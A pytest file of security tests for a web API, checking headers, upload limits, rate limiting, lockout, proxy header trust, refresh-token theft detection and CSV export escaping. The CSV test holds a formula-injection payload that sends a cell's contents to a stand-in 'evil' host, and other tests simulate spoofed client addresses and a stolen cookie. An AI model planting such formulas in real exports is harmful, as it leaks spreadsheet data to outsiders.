"""HTTP hardening: headers, request size, rate limits, lockout and password policy."""

import asyncio
import uuid
from collections.abc import AsyncIterator

import pytest
from httpx import AsyncClient

from glasshaus.identity.passwords import password_problem
from tests.factories import PASSWORD, make_world

pytestmark = [pytest.mark.integration, pytest.mark.usefixtures("migrated")]


def test_password_policy() -> None:
    assert password_problem("password1234") is not None
    assert password_problem("abcabcabcabc") is not None
    assert password_problem("glasshaus2026") is not None
    assert password_problem("ada.lovelace99", email="ada.lovelace@example.com") is not None
    assert password_problem("violet kettle under moonlight") is None


async def test_security_headers_and_body_cap(client: AsyncClient) -> None:
    world = await make_world()
    r = await client.get("/api/v1/users/me", headers=world.headers)
    for name, value in {
        "x-content-type-options": "nosniff",
        "x-frame-options": "DENY",
        "cache-control": "no-store",
        "content-security-policy": "default-src 'none'; frame-ancestors 'none'",
    }.items():
        assert r.headers[name] == value, name
    docs = await client.get("/api/docs")
    assert "content-security-policy" not in docs.headers  # Swagger UI loads its own assets
    big = await client.post(
        "/api/v1/tasks", content=b"x" * 32, headers={**world.headers, "content-length": str(11 * 1024 * 1024)}
    )
    assert big.status_code == 413

    # A chunked body without Content-Length is counted as it streams (no buffering of huge uploads).
    async def chunks(parts: list[bytes]) -> AsyncIterator[bytes]:
        for part in parts:
            yield part

    streamed = await client.post(
        "/api/v1/auth/login",
        content=chunks([b"x" * (1024 * 1024)] * 11),
        headers={"content-type": "application/json"},
    )
    assert streamed.status_code == 413 and streamed.json()["code"] == "payload_too_large"
    # Small chunked bodies still reach the app intact.
    body = b'{"email": "nobody@example.com", ' + b'"password": "wrong password here"}'
    small = await client.post(
        "/api/v1/auth/login",
        content=chunks([body[:10], body[10:]]),
        headers={"content-type": "application/json"},
    )
    assert small.status_code == 401


async def test_api_rate_limit(client: AsyncClient, monkeypatch: pytest.MonkeyPatch) -> None:
    from glasshaus.config import get_settings

    world = await make_world()
    monkeypatch.setattr(get_settings(), "api_rate_limit_per_minute", 5)
    codes = [(await client.get("/api/v1/users/me", headers=world.headers)).status_code for _ in range(7)]
    assert codes[:5] == [200] * 5 and codes[-1] == 429
    assert (await client.get("/healthz")).status_code == 200  # health checks are never limited


async def test_account_lockout_ignores_client_ip(client: AsyncClient) -> None:
    from glasshaus.identity import service as identity

    world = await make_world()
    body = {"email": world.owner.email, "password": "not the password!", "organization": world.tenant.slug}
    codes = []
    for i in range(identity.ACCOUNT_MAX_ATTEMPTS + 1):
        r = await client.post("/api/v1/auth/login", json=body, headers={"X-Forwarded-For": f"10.0.0.{i}"})
        codes.append(r.status_code)
    assert codes[-1] == 429
    ok = await client.post("/api/v1/auth/login", json={**body, "password": PASSWORD})
    assert ok.status_code == 429  # still locked for this window


async def test_weak_passwords_are_refused(client: AsyncClient) -> None:
    world = await make_world()
    r = await client.post(
        "/api/v1/users",
        json={"email": "weak@example.com", "name": "W", "password": "password1234"},
        headers=world.headers,
    )
    assert r.status_code == 422 and "too common" in r.text


async def test_forwarded_for_only_from_trusted_proxies() -> None:
    from starlette.types import Receive, Scope, Send

    from glasshaus.api.proxy import ProxyHeadersMiddleware, TrustedProxies

    seen: list[str] = []

    async def app(scope: Scope, receive: Receive, send: Send) -> None:
        seen.append(scope["client"][0])

    middleware = ProxyHeadersMiddleware(app)
    middleware.trusted = TrustedProxies(["10.9.0.0/24", "localhost"])
    await middleware.trusted.refresh()

    async def call(peer: str, forwarded: str | None) -> str:
        headers = [(b"x-forwarded-for", forwarded.encode())] if forwarded else []
        await middleware({"type": "http", "client": (peer, 1), "headers": headers}, None, None)  # type: ignore[arg-type]
        return seen[-1]

    # The trusted proxy's own (right-most) entry wins; anything the client prepended is ignored.
    assert await call("10.9.0.5", "6.6.6.6, 198.51.100.7") == "198.51.100.7"
    assert await call("127.0.0.1", "198.51.100.8") == "198.51.100.8"  # hostname resolved
    # Direct clients cannot choose their address.
    assert await call("203.0.113.9", "10.0.0.1") == "203.0.113.9"
    assert await call("10.9.0.5", "not-an-ip") == "10.9.0.5"
    assert await call("10.9.0.5", None) == "10.9.0.5"


async def test_slow_dns_never_delays_a_request(monkeypatch: pytest.MonkeyPatch) -> None:
    """A resolver that hangs (e.g. `web` not started yet) must not stall requests or health checks."""
    import socket
    import time

    from starlette.types import Receive, Scope, Send

    from glasshaus.api import proxy

    def hang(*_args: object, **_kwargs: object) -> list[object]:
        time.sleep(1.5)
        raise socket.gaierror("no such host")

    monkeypatch.setattr(socket, "getaddrinfo", hang)
    monkeypatch.setattr(proxy, "RESOLVE_TIMEOUT_SECONDS", 0.2)
    seen: list[str] = []

    async def app(scope: Scope, receive: Receive, send: Send) -> None:
        seen.append(scope["client"][0])

    middleware = proxy.ProxyHeadersMiddleware(app, trusted=["web", "127.0.0.1"])
    started = time.monotonic()
    for _ in range(3):
        scope = {
            "type": "http",
            "client": ("127.0.0.1", 1),
            "headers": [(b"x-forwarded-for", b"198.51.100.9")],
        }
        await middleware(scope, None, None)  # type: ignore[arg-type]
    assert time.monotonic() - started < 0.5
    assert seen == ["198.51.100.9"] * 3  # address literals work while names resolve
    await asyncio.sleep(0.3)  # the background lookup gives up; requests carry on
    assert middleware.trusted.resolved == []


async def test_rate_limit_counts_client_address_too(app, monkeypatch: pytest.MonkeyPatch) -> None:  # type: ignore[no-untyped-def]
    """Inventing a new Authorization header per request does not escape the limit."""
    from httpx import ASGITransport

    from glasshaus.api import hardening
    from glasshaus.config import get_settings

    monkeypatch.setattr(get_settings(), "api_rate_limit_per_minute", 2)
    transport = ASGITransport(app=app, client=(f"203.0.113.{uuid.uuid4().int % 250}", 4000))
    async with AsyncClient(transport=transport, base_url="http://test") as direct:
        codes = [
            (await direct.get("/api/v1/users/me", headers={"Authorization": f"Bearer junk-{i}"})).status_code
            for i in range(2 * hardening.PER_ADDRESS_FACTOR + 2)
        ]
    assert codes[0] == 401 and codes[-1] == 429


async def test_lockout_lets_the_owner_in_from_a_known_address(client: AsyncClient) -> None:
    from glasshaus.identity import service as identity

    world = await make_world()
    good = {"email": world.owner.email, "password": PASSWORD, "organization": world.tenant.slug}
    home = {"X-Forwarded-For": "10.9.9.9"}
    assert (await client.post("/api/v1/auth/login", json=good, headers=home)).status_code == 200
    bad = {**good, "password": "not the password!"}
    for i in range(identity.ACCOUNT_MAX_ATTEMPTS + 1):  # a stranger, from many addresses
        await client.post("/api/v1/auth/login", json=bad, headers={"X-Forwarded-For": f"10.1.0.{i}"})
    new_place = await client.post("/api/v1/auth/login", json=good, headers={"X-Forwarded-For": "10.2.0.1"})
    assert new_place.status_code == 429  # guessing from new addresses stays blocked
    assert (await client.post("/api/v1/auth/login", json=good, headers=home)).status_code == 200


async def test_reusing_an_old_refresh_token_ends_the_sign_in(
    client: AsyncClient, monkeypatch: pytest.MonkeyPatch
) -> None:
    from datetime import timedelta

    from glasshaus.identity import service as identity

    world = await make_world()
    body = {"email": world.owner.email, "password": PASSWORD, "organization": world.tenant.slug}
    assert (await client.post("/api/v1/auth/login", json=body)).status_code == 200
    stolen = client.cookies.get("gh_refresh")
    assert stolen
    assert (await client.post("/api/v1/auth/refresh")).status_code == 200  # the real browser rotates
    assert (await client.get("/api/v1/users/me")).status_code == 200
    monkeypatch.setattr(identity, "REUSE_GRACE", timedelta(seconds=-1))
    thief = AsyncClient(transport=client._transport, base_url=str(client.base_url))
    thief.cookies.set("gh_refresh", stolen)
    assert (await thief.post("/api/v1/auth/refresh")).status_code == 401
    await thief.aclose()
    assert (await client.post("/api/v1/auth/refresh")).status_code == 401  # everyone signed out


async def test_read_only_tokens_change_nothing(client: AsyncClient) -> None:
    from glasshaus.core.rbac import Scope
    from tests.factories import auth, create_task, token_for

    world = await make_world()
    task = await create_task(client, world)
    r = await client.post(
        "/api/v1/time-entries", json={"task": task["id"], "minutes": 30}, headers=world.headers
    )
    entry = r.json()
    reader = auth(await token_for(world.owner, (Scope.READ,)))
    r = await client.patch(f"/api/v1/time-entries/{entry['id']}", json={"minutes": 1}, headers=reader)
    assert r.status_code == 403
    assert (await client.delete(f"/api/v1/time-entries/{entry['id']}", headers=reader)).status_code == 403
    r = await client.post(
        f"/api/v1/projects/{world.project.id}/views",
        json={"name": "Mine", "kind": "list", "config": {}},
        headers=reader,
    )
    assert r.status_code == 403


async def test_promotions_need_a_signed_in_person(client: AsyncClient) -> None:
    from tests.factories import make_user

    world = await make_world()
    person = await make_user(world.tenant)
    r = await client.patch(f"/api/v1/users/{person.id}", json={"org_role": "admin"}, headers=world.headers)
    assert r.status_code == 403 and "signed in" in r.json()["detail"]
    r = await client.patch(f"/api/v1/users/{person.id}", json={"org_role": "guest"}, headers=world.headers)
    assert r.status_code == 200  # lowering access by token is fine


async def test_csv_cells_cannot_run_formulas(client: AsyncClient) -> None:
    from tests.factories import create_task

    world = await make_world()
    await create_task(client, world, title="Plain", tags=['=HYPERLINK("//evil/?"&B2)'])
    r = await client.get(f"/api/v1/projects/{world.project.id}/tasks/export", headers=world.headers)
    assert r.status_code == 200
    text = r.text.lower()  # tags are stored in lower case
    assert "'=hyperlink" in text and ",=hyperlink" not in text and '"=hyperlink' not in text


def test_slack_commands_need_a_signing_secret() -> None:
    from glasshaus.core.errors import Unauthenticated
    from glasshaus.integrations.slack_command import verify

    with pytest.raises(Unauthenticated):
        verify("", {"x-slack-request-timestamp": "1", "x-slack-signature": "v0=x"}, b"", now=1)
